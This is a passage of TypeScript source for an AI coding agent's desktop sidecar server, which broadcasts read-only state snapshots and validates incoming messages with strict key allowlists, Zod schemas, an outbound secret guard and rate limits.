    }
    for (const connection of this.connections) {
      this.sendThreadGoalSnapshot(connection)
    }
  }

  /**
   * P4-10 — read-only memory metadata snapshot. The domain excludes memory bodies;
   * this shared path still applies clone/JSON checks, secretGuard, and size caps.
   */
  private sendMemorySnapshot(connection: Connection): void {
    if (!this.memory) {
      return
    }
    try {
      const raw = this.memory.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'memory.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'memory.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        memory: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] memory.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastMemorySnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendMemorySnapshot(connection)
    }
  }

  /**
   * P4-9 — read-only background-task snapshot from the runtime's live
   * app-state store (`AppState.tasks`). Kill/stop/inspect stay engine-side;
   * the desktop receives display state only.
   */
  private sendTasksSnapshot(connection: Connection): void {
    if (!this.tasks) {
      return
    }
    try {
      const raw = this.tasks.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'tasks.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'tasks.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        tasks: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] tasks.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastTasksSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendTasksSnapshot(connection)
    }
  }

  /**
   * P4-8 — read-only orchestrator worker snapshot (D2 `decisions/AGENT-CHROME.md`).
   * Async because the session plane is a file-backed engine read
   * (`readSessionStateWithContinuity`); the shared send path still applies
   * clone/JSON checks, secretGuard, and size caps.
   */
  private async sendAgentModeSnapshot(connection: Connection): Promise<void> {
    if (!this.agentMode) {
      return
    }
    try {
      const raw = await this.agentMode.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'agent-mode.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'agent-mode.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        agentMode: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] agent-mode.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private async broadcastAgentModeSnapshot(): Promise<void> {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      await this.sendAgentModeSnapshot(connection)
    }
  }

  /**
   * P4-24c — build + send the composer run-controls snapshot to one connection.
   * `getSnapshot()` is a pure, throw-free read of the live app-state + the engine's
   * own model/effort/fast helpers; the shared `send` path applies clone/JSON checks,
   * the outbound secret guard, and the size cap. Wrapped so a snapshot failure can
   * never strand the attaching connection.
   */
  private sendRunControlsSnapshot(connection: Connection): void {
    if (!this.runControls) {
      return
    }
    try {
      const raw = this.runControls.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'run-controls.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'run-controls.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        runControls: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] run-controls.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastRunControlsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendRunControlsSnapshot(connection)
    }
  }

  /**
   * P4-6 title-rider — push the one-shot AI title to every attached connection.
   * `send` applies the clone/JSON checks, the outbound secretGuard, and the size
   * cap (the title is plain display text, guard-clean by construction). Main taps
   * this frame → `host.setTitle`; it is deliberately NOT part of attach/replay —
   * it fires once, after the first turn, only when a title was actually generated.
   */
  private broadcastSessionTitle(title: string): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.send(connection, {
        kind: 'session-title',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        title,
      })
    }
  }

  /**
   * P4-5 — build + send the redacted accounts snapshot to one connection. Same
   * idiom as the other read-seams: `getSnapshot()` is a pure, throw-free read of
   * the live pool; the shared `send` path applies clone/JSON checks, the outbound
   * secret guard, and the size cap. Wrapped so a snapshot failure can never
   * strand the attaching connection.
   */
  private sendAccountsSnapshot(connection: Connection): void {
    if (!this.accounts) {
      return
    }
    try {
      const raw = this.accounts.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'accounts.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'accounts.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        accounts: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] accounts.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastAccountsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendAccountsSnapshot(connection)
    }
  }

  /**
   * P4-15 — broadcast one `oauth.login.progress` frame (the live sign-in
   * back-channel). Carries non-secret state only; `send()`'s secretGuard is the
   * proof (a token-keyed field would drop the whole frame). On `success` the
   * account has just been written engine-side, so re-broadcast the accounts
   * snapshot too — the SAME mechanism that clears the first-run OAuth surface and
   * the reauth banner (both derive from `accounts.snapshot`), for BOTH the
   * new-account (alias-submit) and re-link (auto-persist) paths uniformly.
   */
  private broadcastOAuthLoginProgress(progress: OAuthLoginProgress): void {
    if (this.connections.size === 0) {
      return
    }
    const frame: ServerFrame = {
      kind: 'oauth.login.progress',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      progress,
    }
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
    if (progress.state === 'success') {
      this.broadcastAccountsSnapshot()
    }
  }

  /**
   * One-shot: populate the pool's usage hints (accounts domain `refreshUsage` →
   * engine `fetchPoolUsage`, read-only) and re-broadcast the snapshot when real
   * usage lands. Guarded so it runs once per sidecar; the fetch itself is
   * 1-min-cached engine-side. Fire-and-forget: any failure is swallowed and the
   * pre-fetch snapshot stands (never blocks attach or history replay).
   */
  private refreshAccountsUsageOnce(): void {
    if (this.usageRefreshStarted || !this.accounts) {
      return
    }
    this.usageRefreshStarted = true
    void this.accounts
      .refreshUsage()
      .then(changed => {
        if (changed) {
          this.broadcastAccountsSnapshot()
        }
      })
      .catch(() => {})
  }

  /**
   * P4-15 — re-broadcast the workspace-trust snapshot after an accept persisted
   * (`trusted:true`), so every attached connection's gate clears. The read is
   * otherwise spawn-frozen; this is the ONE mutation path (mirrors the accounts
   * re-broadcast after a pool-changing verb).
   */
  private broadcastWorkspaceTrustSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendWorkspaceTrustSnapshot(connection)
    }
  }

  /**
   * P4-14 — build + send the workspace-trust snapshot to one connection.
   * Spawn-time-frozen like settings: `getSnapshot()` is a pure read, no live
   * re-broadcast (a workspace switch spawns a new sidecar at the new cwd).
   */
  private sendWorkspaceTrustSnapshot(connection: Connection): void {
    if (!this.workspaceTrust) {
      return
    }
    try {
      const raw = this.workspaceTrust.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'workspace-trust.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'workspace-trust.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        workspaceTrust: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] workspace-trust.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-14 — build + send the diagnostics snapshot to one connection.
   * Spawn-time-frozen like settings: `getSnapshot()` is a pure read, no live
   * re-broadcast (the doctor/install checks run once at spawn).
   */
  private sendDiagnosticsSnapshot(connection: Connection): void {
    if (!this.diagnostics) {
      return
    }
    try {
      const raw = this.diagnostics.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'diagnostics.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'diagnostics.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        diagnostics: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] diagnostics.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-13 — build + send the RemoteSettings snapshot (bridge status + real
   * command-filter truth) to one connection. Same idiom as the other read-seams:
   * `getSnapshot()` is a pure, throw-free read; the shared `send` path applies
   * clone/JSON checks, the outbound secret guard, and the size cap.
   */
  private sendRemoteSettingsSnapshot(connection: Connection): void {
    if (!this.remoteSettings) {
      return
    }
    try {
      const raw = this.remoteSettings.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'remoteSettings.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'remoteSettings.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        remoteSettings: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] remoteSettings.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastRemoteSettingsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendRemoteSettingsSnapshot(connection)
    }
  }

  /**
   * P4-19 — re-emit the (now-refreshed) settings snapshot to every attached
   * connection after a write lands, so the value editors and provenance badges
   * reflect the persisted change without a reconnect.
   */
  private broadcastSettingsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendSettingsSnapshot(connection)
    }
  }

  private send(connection: Connection, frame: ServerFrame): void {
    // F6 — outbound secret-key assertion on EVERY frame (events AND ready). The
    // engine is the sole secret owner; a token key must never cross IPC. This is
    // separate from JSON-safety (a token object is valid JSON). An error frame
    // is exempt (it is sidecar-authored and carries no session payload) to avoid
    // an infinite loop if the guard itself needs to report.
    if (frame.kind !== 'error') {
      const secret = scanForSecrets(frame)
      if (!secret.ok) {
        this.log(
          `[sidecar] BLOCKED outbound frame carrying secret key "${secret.key}" at ${secret.path} (F6)`,
        )
        this.sendError(
          connection,
          undefined,
          'internal_error',
          'outbound frame blocked: contained a credential field',
          false,
        )
        return
      }
    }

    let encoded: Buffer
    try {
      encoded = encodeFrame(frame)
    } catch (error) {
      this.log(
        `[sidecar] failed to encode frame kind=${frame.kind}: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      return
    }

    // Sanity bound on outbound size (F3): trusted engine output may be large,
    // but a runaway is dropped rather than allowed to grow unbounded.
    if (encoded.byteLength > MAX_OUTBOUND_FRAME_BYTES) {
      this.log(
        `[sidecar] dropped oversized outbound frame kind=${frame.kind} (${encoded.byteLength} > ${MAX_OUTBOUND_FRAME_BYTES})`,
      )
      return
    }

    try {
      connection.socket.write(encoded)
    } catch (error) {
      this.log(
        `[sidecar] write failed, dropping connection: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      this.removeConnection(connection)
    }
  }

  private sendError(
    connection: Connection,
    requestId: string | undefined,
    code: Extract<ServerFrame, { kind: 'error' }>['code'],
    message: string,
    retryable: boolean,
  ): void {
    this.send(connection, {
      kind: 'error',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId,
      code,
      message,
      retryable,
    })
  }

  private checkRate(connection: Connection): boolean {
    const now = Date.now()
    if (now - connection.rateWindowStart >= RATE_WINDOW_MS) {
      connection.rateWindowStart = now
      connection.rateCount = 0
    }
    connection.rateCount += 1
    return connection.rateCount <= MAX_FRAMES_PER_WINDOW
  }
}

/**
 * F10 — strict per-type key allowlist. The reused Zod schemas strip unknown
 * keys; this rejects a frame that carries any key not in the renderer-facing
 * contract, at every renderer-controlled level: the message itself,
 * `app.submit.options` (rejecting `options.uuid`, which is engine-identity), and
 * `permission.response.response` (rejecting host-only escalations the Zod schema
 * still accepts — `deny.interrupt`, `allow.updatedPermissions`). Returns an error
 * string, or null if the shape is clean. Type/field VALUES are still validated by
 * the Zod parse afterward; this only enforces "no extra keys".
 */
function checkStrictKeys(message: unknown): string | null {
  if (typeof message !== 'object' || message === null || Array.isArray(message)) {
    return 'message must be an object'
  }
  const obj = message as Record<string, unknown>
  const type = obj.type

  const allowedByType = new Map<string, Set<string>>([
    ['app.submit', new Set(['type', 'requestId', 'prompt', 'options'])],
    ['app.abort', new Set(['type', 'requestId', 'reason'])],
    ['permission.response', new Set(['type', 'requestId', 'response'])],
    // C2 (PERMISSION-BOUNDARY.md §3). NOTE: no `destination` key — scope is
    // pinned to `session` at the sidecar; a renderer that tries to send one
    // is rejected here.
    ['permission.setMode', new Set(['type', 'requestId', 'mode'])],
    // C5 (P4-20, ASK-USER-QUESTION-ANSWER.md). The renderer authors ONLY the
    // per-question `answers` (option indices + built-in "Other…" freeform); the
    // inner `{optionIndices, other}` shape is closed by the sidecar-local Zod
    // schema below (checkStrictKeys guards only top-level keys).
    ['askUserQuestion.answer', new Set(['type', 'requestId', 'answers'])],
    // P4-5 account verbs (app-owned; see ACCOUNT_VERB_TYPES). Each key set is the
    // exact renderer-facing contract; anything else is rejected before the Zod
    // parse. `account.delete` requires `confirm` (destructive → fail-closed).
    ['account.switch', new Set(['type', 'requestId', 'accountId'])],
    ['account.rename', new Set(['type', 'requestId', 'accountId', 'alias'])],
    ['account.delete', new Set(['type', 'requestId', 'accountId', 'confirm'])],
    ['account.logout', new Set(['type', 'requestId'])],
    ['account.touchAll', new Set(['type', 'requestId'])],
    ['account.login', new Set(['type', 'requestId'])],
    // P4-15 OAuth login sub-protocol. The renderer authors ONLY the user-typed
    // code/alias string — never a token; the engine owns every credential write.
    ['account.oauthPasteCode', new Set(['type', 'requestId', 'code'])],
    ['account.oauthAlias', new Set(['type', 'requestId', 'alias'])],
    ['account.oauthCancel', new Set(['type', 'requestId'])],
    // P4-15 workspace-trust accept verb (app-owned; see WORKSPACE_TRUST_VERB_TYPES).
    // HC1: no path key — the sidecar trusts only its own spawn cwd.
    ['workspace.trust', new Set(['type', 'requestId'])],
    // P4-8b agent-mode set verb (app-owned; see AGENT_MODE_VERB_TYPES). The
    // renderer authors ONLY the boolean intent — any other key is rejected.
    ['agent-mode.set', new Set(['type', 'requestId', 'active'])],
    // P4-24c composer run-control verbs (app-owned; see RUN_CONTROL_VERB_TYPES). The
    // renderer authors ONLY the value/selection — any other key is rejected.
    ['model.set', new Set(['type', 'requestId', 'model'])],
    ['effort.set', new Set(['type', 'requestId', 'effort'])],
    ['fast.set', new Set(['type', 'requestId', 'active'])],
    // P4-13 RemoteSettings verbs (app-owned; see REMOTE_VERB_TYPES).
    ['remoteSettings.bridgeToggle', new Set(['type', 'requestId', 'enable'])],
    ['remoteSettings.directConnect', new Set(['type', 'requestId', 'serverUrl'])],
    // P4-19 settings write verb (app-owned; see SETTINGS_VERB_TYPES). The exact
    // renderer-facing contract; any other key is rejected before the Zod parse.
    ['settings.setValue', new Set(['type', 'requestId', 'source', 'key', 'value'])],
    ['app.ping', new Set(['type', 'nonce'])],
  ])
  const allowedOptionKeys = new Set(['isMeta', 'goalSnapshot'])
  // The renderer-facing permission contract (protocol.ts PermissionResponseInput)
  // exposes ONLY these keys. The reused Zod schema additionally accepts host-only
  // escalations (allow.updatedPermissions, deny.interrupt) that the renderer must
  // not be able to set; reject any key outside this allowlist rather than let the
  // Zod parse silently strip it or forward `interrupt` to the engine.
  // `applySuggestions` (C1) is a renderer-facing key: an index selection among
  // the engine-minted suggestions, validated in validateSuggestionSelection.
  const allowedResponseKeys = new Set([
    'behavior',
    'updatedInput',
    'message',
    'applySuggestions',
  ])

  // `Map.get`, not `key in obj` — an inherited key like "constructor" or
  // "toString" must NOT be treated as a known message type (it would also crash
  // a plain-object lookup by resolving to a prototype function).
  if (typeof type !== 'string') {
    return `unknown message type: ${String(type)}`
  }
  const allowed = allowedByType.get(type)
  if (!allowed) {
    return `unknown message type: ${type}`
  }
  for (const key of Object.keys(obj)) {
    if (!allowed.has(key)) {
      return `unexpected key "${key}" on ${type}`
    }
  }

  if (type === 'app.submit' && obj.options !== undefined) {
    if (typeof obj.options !== 'object' || obj.options === null || Array.isArray(obj.options)) {
      return 'options must be an object'
    }
    for (const key of Object.keys(obj.options)) {
      if (!allowedOptionKeys.has(key)) {
        return `unexpected key "${key}" on app.submit.options`
      }
    }
  }

  if (type === 'permission.response' && obj.response !== undefined) {
    if (
      typeof obj.response !== 'object' ||
      obj.response === null ||
      Array.isArray(obj.response)
    ) {
      return 'response must be an object'
    }
    for (const key of Object.keys(obj.response)) {
      if (!allowedResponseKeys.has(key)) {
        return `unexpected key "${key}" on permission.response.response`
      }
    }
  }

  return null
}

/**
 * C2 — sidecar-LOCAL schema for `permission.setMode`
 * (PERMISSION-BOUNDARY.md §3). Deliberately NOT part of the engine's shared
 * `appClientMessageSchema` (the WS server shares that and has no handler for
 * this frame). The mode allowlist is the wire constant; `bypassPermissions`
 * and `auto` are rejected with explicit messages before this parse runs.
 */
const permissionSetModeMessageSchema = z.object({
  type: z.literal('permission.setMode'),
  requestId: z.string().min(1),
  mode: z.enum(PERMISSION_SET_MODE_MODES),
})

/**
 * C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — sidecar-LOCAL schema for the
 * AskUserQuestion answer frame. App-owned, NOT part of the engine's shared
 * schema. Structural only: the renderer authors option INDICES + a bounded
 * "Other…" freeform string; the sidecar re-attaches the engine's own option
 * labels and re-reads the gated questions (handleAskUserQuestionAnswer), so the
 * semantic checks (index in range, cardinality vs multiSelect, question count)
 * are done against the LIVE pending request, never trusted from the frame. The
 * inner `{optionIndices, other}` object is `.strict()` so an extra nested key is
 * rejected, not stripped (checkStrictKeys guards only the top level).
 */
const askUserQuestionAnswerSchema = z
  .object({
    optionIndices: z.array(z.number().int().nonnegative()),
    other: z.string().max(MAX_QUESTION_ANSWER_CHARS).optional(),
  })
  .strict()

const askUserQuestionAnswerMessageSchema = z.object({
  type: z.literal('askUserQuestion.answer'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  answers: z.array(askUserQuestionAnswerSchema).min(1).max(MAX_ANSWER_QUESTIONS),
})

/**
 * P4-5 — sidecar-LOCAL schemas for the account lifecycle verbs (protocol.ts:
 * ACCOUNT_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + bounds. The business rules (target exists, alias
 * unique, vault-backed) are re-checked against the LIVE pool in the domain (T6),
 * never trusted from the frame. `requestId`/`accountId` are length-bounded like
 * every other renderer-controlled string; `confirm` MUST be literal `true`
 * (a missing/false confirm on a destructive verb is rejected here, fail-closed).
 */
const accountRequestIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const accountIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const accountAliasSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)

const accountVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('account.switch'),
    requestId: accountRequestIdSchema,
    accountId: accountIdSchema,
  }),
  z.object({
    type: z.literal('account.rename'),
    requestId: accountRequestIdSchema,
    accountId: accountIdSchema,
    alias: accountAliasSchema,
  }),
  z.object({
    type: z.literal('account.delete'),
    requestId: accountRequestIdSchema,
    accountId: accountIdSchema,
    confirm: z.literal(true),
  }),
  z.object({
    type: z.literal('account.logout'),
    requestId: accountRequestIdSchema,
  }),
  z.object({
    type: z.literal('account.touchAll'),
    requestId: accountRequestIdSchema,
  }),
  z.object({
    type: z.literal('account.login'),
    requestId: accountRequestIdSchema,
  }),
  // P4-15 — OAuth login sub-protocol. Structural only (shape + bounds); the
  // engine re-validates the alias and consumes the code. `code`/`alias` are
  // length-bounded like every renderer-controlled string. `alias` may be empty
  // (the "leave blank" skip); `code` must be non-empty to be worth submitting.
  z.object({
    type: z.literal('account.oauthPasteCode'),
    requestId: accountRequestIdSchema,
    code: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('account.oauthAlias'),
    requestId: accountRequestIdSchema,
    alias: z.string().max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('account.oauthCancel'),
    requestId: accountRequestIdSchema,
  }),
])

/**
 * P4-15 — sidecar-LOCAL schema for the workspace-trust accept verb (protocol.ts:
 * WORKSPACE_TRUST_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId`. There is NO path field — HC1:
 * the sidecar trusts only its OWN spawn cwd, never a renderer-supplied directory.
 */
const workspaceTrustMessageSchema = z.object({
  type: z.literal('workspace.trust'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
})

/**
 * P4-8b — sidecar-LOCAL schema for the agent-mode set verb (protocol.ts:
 * AGENT_MODE_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId` + a strict boolean `active`.
 * A non-boolean `active` is rejected here fail-closed before the domain switches
 * mode; the renderer never authors anything but the boolean intent.
 */
const agentModeSetMessageSchema = z.object({
  type: z.literal('agent-mode.set'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  active: z.boolean(),
})

/**
 * P4-24c — sidecar-LOCAL schema for the composer run-control set verbs (protocol.ts:
 * RUN_CONTROL_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId` + a bounded value/selection. The
 * BUSINESS validation (is `model` a real option, is `effort` a valid level) is the
 * engine setter's own concern in the domain — the boundary checks shape only, never
 * trusting the frame. A non-string model/effort or non-boolean `active` is rejected
 * here fail-closed before the domain runs any setter.
 */
const runControlVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('model.set'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    model: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('effort.set'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    effort: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('fast.set'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    active: z.boolean(),
  }),
])

/**
 * P4-13 — sidecar-LOCAL schemas for the RemoteSettings verbs (protocol.ts:
 * REMOTE_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + bounds. `serverUrl` is length-bounded like every
 * other renderer-controlled string; the domain re-derives everything else
 * (the real bridge flag, the real cwd) rather than trusting the frame.
 */
const remoteRequestIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const remoteServerUrlSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)

const remoteVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('remoteSettings.bridgeToggle'),
    requestId: remoteRequestIdSchema,
    enable: z.boolean(),
  }),
  z.object({
    type: z.literal('remoteSettings.directConnect'),
    requestId: remoteRequestIdSchema,
    serverUrl: remoteServerUrlSchema,
  }),
])

/**
 * P4-19 — sidecar-LOCAL schema for the settings write verb (protocol.ts:
 * SETTINGS_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + editable-source enum + bounded key/value. The
 * per-KEY value-type match (boolean vs enum vs int) is enforced separately by
 * `validateEditableSettingValue` at the boundary (handleSettingsVerb), and the
 * domain re-checks all three as the last gate before disk. `source` is the
 * closed editable-layer enum — policy/flag can never be named here.
 */
const settingsRequestIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const settingsKeySchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const settingsValueSchema = z.union([
  z.boolean(),
  z.string().max(MAX_TEXT_FIELD_CHARS),
  z.number(),
])

const settingsVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('settings.setValue'),
    requestId: settingsRequestIdSchema,
    source: z.enum([...EDITABLE_SETTING_SOURCES]),
    key: settingsKeySchema,
    value: settingsValueSchema,
  }),
])

/**
 * C3 — convert the engine's live `ToolPermissionContext` into the wire
 * snapshot (PERMISSION-BOUNDARY.md §4). Pure JSON POJO: the context's
 * `additionalWorkingDirectories` is a Map, which `checkJsonSafe` fail-closes
 * on, so it becomes an entries array here. Rule lists are copied so the frame
 * never aliases live engine state. Faithfulness rule: this is the ONLY place
 * a snapshot is built, and its input is always the engine's own context
 * object — never a renderer-side reconstruction.
 */
export function buildPermissionContextSnapshot(
  context: ToolPermissionContext,
): PermissionContextSnapshot {
  const additionalWorkingDirectories: Array<{ path: string; source: string }> =
    []
  context.additionalWorkingDirectories.forEach(
    (entry: { path: string; source: string }) => {
      additionalWorkingDirectories.push({
        path: entry.path,
        source: entry.source,
      })
    },
  )
  return {
    mode: context.mode,
    alwaysAllowRules: cloneRulesBySource(context.alwaysAllowRules),
    alwaysDenyRules: cloneRulesBySource(context.alwaysDenyRules),
    alwaysAskRules: cloneRulesBySource(context.alwaysAskRules),
    additionalWorkingDirectories,
    isBypassPermissionsModeAvailable: context.isBypassPermissionsModeAvailable,
  }
}

function cloneRulesBySource(
  rules: ToolPermissionRulesBySource,
): Record<string, string[]> {
  const result: Record<string, string[]> = {}
  for (const [source, ruleStrings] of Object.entries(rules)) {
    if (ruleStrings) {
      result[source] = [...ruleStrings]
    }
  }
  return result
}

type SuggestionSelectionResult =
  | { ok: true; updates: PermissionUpdate[] }
  | { ok: false; reason: string }

/**
 * C1 — validate a renderer "always allow" selection (PERMISSION-BOUNDARY.md).
 * The renderer may request durable permission updates ONLY by selecting, by
 * index, among the `permission_suggestions` the ENGINE minted on this exact
 * pending request. Anything else — a selection on a deny, a non-array, a
 * non-integer / negative / out-of-range index, a duplicate, an oversize list,
 * or a request that minted no suggestions — is rejected fail-closed (error
 * frame, request stays pending). The returned updates are the engine's own
 * objects (the caller clones before use); the renderer never authors rule
 * content, so T6b's guarantee is preserved.
 */
function validateSuggestionSelection(
  rawMessage: unknown,
  behavior: AppPermissionResponse['behavior'],
  request: AppPermissionRequest['request'],
): SuggestionSelectionResult {
  const raw = (
    rawMessage as { response?: { applySuggestions?: unknown } } | null
  )?.response?.applySuggestions
  if (raw === undefined) {
    return { ok: true, updates: [] }
  }
  if (behavior !== 'allow') {
    return { ok: false, reason: 'applySuggestions is only valid on an allow' }
  }
  if (!Array.isArray(raw)) {
    return { ok: false, reason: 'applySuggestions must be an array of indices' }
  }
  if (raw.length === 0) {
    return { ok: true, updates: [] }
  }
  if (raw.length > MAX_SUGGESTION_SELECTIONS) {
    return {
      ok: false,
      reason: `applySuggestions exceeds ${MAX_SUGGESTION_SELECTIONS} entries`,
    }
  }
  // Runtime-narrow the engine-typed field: the request came from the engine,
  // but the boundary stays defensive about shape (same posture as
  // extractGatedToolInput).
  const suggestions = request.permission_suggestions
  if (!Array.isArray(suggestions) || suggestions.length === 0) {
    return {
      ok: false,
      reason: 'request has no permission_suggestions to select from',
    }
  }
  const seen = new Set<number>()
  const updates: PermissionUpdate[] = []
  for (const value of raw) {
    if (
      typeof value !== 'number' ||
      !Number.isInteger(value) ||
      value < 0 ||
      value >= suggestions.length
    ) {
      return {
        ok: false,
        reason: 'applySuggestions contains an invalid or out-of-range index',
      }
    }
    if (seen.has(value)) {
      return { ok: false, reason: 'applySuggestions contains a duplicate index' }
    }
    seen.add(value)
    updates.push(suggestions[value] as PermissionUpdate)
  }
  return { ok: true, updates }
}

/**
 * Pull the tool input the engine actually gated out of the raw permission
 * request, so T6 can compare it against the renderer's `updatedInput`. The
 * request is an `SDKControlPermissionRequest`; the gated tool input lives at
 * `request.input` (mirrors `PermissionPromptTool.inputSchema` — `{ tool_name,
 * input, tool_use_id }`). Returns undefined if the shape is unexpected, in which
 * case T6 falls back to allowing an empty `updatedInput` only.
 */
function extractGatedToolInput(
  request: import('../../src/app-runtime/sessionEvents.js').AppPermissionRequest['request'],
): Record<string, unknown> | undefined {
  const candidate = request as { input?: unknown }
  if (
    candidate.input !== null &&
    typeof candidate.input === 'object' &&
    !Array.isArray(candidate.input)
  ) {
    return candidate.input as Record<string, unknown>
  }
  return undefined
}

type AskUserQuestionReconstructResult =
  | { ok: true; answers: Record<string, string> }
  | { ok: false; reason: string }

/** One engine-minted question, defensively narrowed from the gated input. */
type NarrowedGatedQuestion = {
  question: string
  options: string[] // option labels, in engine order
  multiSelect: boolean
}

/**
 * Narrow the gated AskUserQuestion input's `questions` into the minimal shape
 * the answer reconstruction needs, defensively (the request came from the
 * engine, but the boundary stays defensive about shape — same posture as
 * `extractGatedToolInput`). Returns undefined if the shape is unexpected.
 */
function narrowGatedQuestions(
  gatedInput: Record<string, unknown> | undefined,
): NarrowedGatedQuestion[] | undefined {
  const raw = gatedInput?.questions
  if (!Array.isArray(raw)) return undefined
  const questions: NarrowedGatedQuestion[] = []
  for (const entry of raw) {
    if (typeof entry !== 'object' || entry === null) return undefined
    const record = entry as Record<string, unknown>
    if (typeof record.question !== 'string') return undefined
    if (!Array.isArray(record.options)) return undefined
    const options: string[] = []
    for (const option of record.options) {
      if (typeof option !== 'object' || option === null) return undefined
      const label = (option as Record<string, unknown>).label
      if (typeof label !== 'string') return undefined
      options.push(label)
    }
    questions.push({
      question: record.question,
      options,
      multiSelect: record.multiSelect === true,
    })
  }
  return questions
}

/**
 * C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — reconstruct the tool's
